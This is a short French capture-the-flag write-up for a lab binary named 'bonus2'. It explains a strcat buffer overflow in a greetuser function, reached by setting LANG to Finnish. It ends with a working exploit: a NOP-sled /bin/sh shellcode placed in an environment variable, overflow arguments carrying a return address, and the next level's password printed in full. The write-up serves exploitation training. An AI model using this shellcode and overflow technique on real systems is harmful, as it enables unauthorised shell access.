



# bonus2


## description
- Il y a un exécutable **bonus2**.
- sans arguments, il n'affiche rien
- avec deux arguments, il affiche Hello et ce qu'on a mis comme arguments.

## Résolution

       0x0804862b <+258>:   call   0x8048484 <greetuser>

Parmis tout le l'assembleur, on voit l'appel a la fonction **greetuser**.

A l'intérieur de **greetuser**, il y a un appel a **strcat** et on va pouvoir exploiter une faille et réécrire **l'eip** et utiliser un **shellcode**.

       0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738
       0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
Le programme récupère la variable d'environnement **LANG** et va nous afficher le mot bonjour suivant la langue de notre variable.(0 = en, 1 = fi, 2 = nl).

Pour pouvoir exploiter ca, on va passer notre langue en finlandais pour utiliser le fait que la salutation en finlandais prends plus de place et va nous permettre d'écrire sur **l'eip** 

On reprends notre **shellcode** du bonus0
```
export LANG=fi
export SHELLCODE=$(python -c 'print "\x90" * 1024 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
./bonus2 $(python -c 'print 40*"A"') $(python -c 'print 18*"B" + "\xad\xf8\xff\xbf"')

cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```